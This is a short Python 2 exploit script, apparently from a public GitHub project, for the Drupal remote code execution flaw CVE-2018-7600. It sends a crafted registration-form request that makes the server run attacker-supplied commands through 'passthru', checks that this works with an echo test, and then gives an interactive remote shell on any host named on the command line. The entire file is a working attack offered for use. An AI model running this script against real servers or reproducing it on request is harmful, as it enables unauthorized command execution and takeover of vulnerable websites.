#!/usr/bin/python2
# -*- coding: utf8 -*-

import sys
import urllib
import urllib2

print '\n############################################################'
print '#                                                          #'
print '#   Drupal Remote Shell using CVE-2018-7600                #'
print '#   Use : DRS.py host      Tested w v8.5.0                 #'
print '#   https://github.com/antonio-fr/DrupalRS                 #'
print '#                                                          #'
print '############################################################\n'

if len(sys.argv)!=2:
	print "Use : ./DRS.py hostname (or IP)"
	sys.exit()
target = sys.argv[1]

def rem_shell(domain, cmd):
	url = 'http://'+domain+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
	payload = { 'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[a][#post_render][]': 'passthru',
		'mail[a][#type]': 'markup', 'mail[a][#markup]': cmd }
	req = urllib2.Request(domain)
	req.add_header('Content-type', 'multipart/form-data')
	r = urllib2.urlopen(url, urllib.urlencode(payload))
	content = r.read()
	if r.getcode() != 200 or content[-1] != "]":
		return "Failure"
	end_resp = content.find('[{"command":') - 1
	if end_resp > 0:
		return content[:end_resp]
	else:
		return ""

def testvuln(site):
	assert rem_shell(site, 'echo ABCZ') == 'ABCZ'

testvuln(target)
print "Connected to",target
print "# CTRL+D RETURN to quit\n"
while True:
	cmd = raw_input("[drupal@"+target+" ~]#")
	if cmd == "\x04":
		break
	print rem_shell(target, cmd)
print "logout"

